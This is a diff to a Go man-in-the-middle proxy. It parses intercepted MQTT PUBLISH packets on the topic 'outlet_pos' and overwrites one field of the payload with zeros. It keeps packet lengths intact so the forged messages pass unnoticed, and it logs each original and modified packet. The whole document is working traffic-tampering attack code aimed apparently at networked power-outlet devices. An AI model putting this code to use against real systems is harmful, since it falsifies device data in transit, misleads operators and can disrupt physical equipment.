@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"encoding/binary"
 	"fmt"
 	"io"
 	"net"
@@ -22,23 +23,64 @@ func (this *mitm) Read(p []byte) (int, error) {
 		return 0, err
 	}
 
-	var (
-		targetTopic  = []byte("outlet_pos")
-		lTargetTopic = len(targetTopic) + 4
-	)
+	targetTopic := []byte("outlet_pos")
 
-	if bytes.Contains(pub, targetTopic) {
-		var (
-			newVal = []byte(strings.Repeat("0", n-lTargetTopic))
-		)
+	// 2nd byte is always len of rest of packet. Note that multiple packets may
+	// end up being read as part of the same call to conn.Read.
 
-		copy(p, pub[:lTargetTopic])
-		copy(p[lTargetTopic:], newVal)
-	} else {
-		copy(p, pub[:n])
+	pos := 0
+
+	for {
+		// type bit
+		tb := pos
+		// size bit
+		sb := pos + 1
+
+		plen := int(pub[sb])
+
+		// additional 2 bytes takes into account type bit and length bit
+		stop := pos + plen + 2
+
+		// additional 2 bytes takes into account type bit and length bit
+		packet := pub[pos+2 : stop]
+
+		if pub[tb] != 48 || !bytes.Contains(packet, targetTopic) {
+			copy(p[pos:], pub[pos:stop])
+		} else {
+			fmt.Printf("ORIGINAL: %s\n", string(packet))
+
+			topicLen := binary.BigEndian.Uint16(packet[0:2])
+			// 2 bytes for topic length, 2 bytes for message identifier after topic
+			startBit := 2 + topicLen + 2
+			payload := packet[startBit:]
+
+			tokens := strings.Split(string(payload), ", ")
+
+			// MQTT messages sometimes have leading and trailing spaces (??)
+			origLen := len(tokens[3])
+			value := strings.TrimSpace(tokens[3])
+			trimLen := len(value)
+
+			tokens[3] = strings.Repeat("0", trimLen) + strings.Repeat(" ", origLen-trimLen)
+
+			payload = []byte(strings.Join(tokens, ", "))
+
+			copy(packet[startBit:], payload)
+
+			fmt.Printf("MODIFIED: %s\n\n", string(packet))
+
+			p[tb] = pub[tb]
+			p[sb] = pub[sb]
+
+			copy(p[pos+2:], packet)
+		}
+
+		pos = stop
+
+		if pos >= n {
+			break
+		}
 	}
-
-	fmt.Println(string(p))
 
 	return n, nil
 }
